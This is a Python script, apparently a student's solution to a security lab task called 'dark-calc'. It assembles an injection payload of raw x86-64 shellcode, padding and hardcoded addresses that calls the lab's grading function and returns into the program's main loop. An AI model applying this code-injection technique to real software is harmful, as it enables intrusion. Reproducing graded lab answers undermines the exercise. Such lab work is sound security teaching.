#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""

import sys

EXPRESSION = 0x721000800FD0
GRADE_EVAL = 0x401A87
MAIN_LOOP = 0x401AC7

shellcode_body = (
    b"\x6a\x04"
    + b"\x5f"
    + b"\x68" + GRADE_EVAL.to_bytes(4, "little")
    + b"\x58"
    + b"\xff\xd0"
)
tail = (
    b"\x68" + MAIN_LOOP.to_bytes(4, "little")
    + b"\xc3"
)

payload = (
    b"\xeb\x1e"
    + b"A" * 16
    + tail
    + EXPRESSION.to_bytes(8, "little")
    + shellcode_body
    + b"\xeb\xe5"
)

assert len(payload) == 45
assert b"\n" not in payload
sys.stdout.buffer.write(payload)





















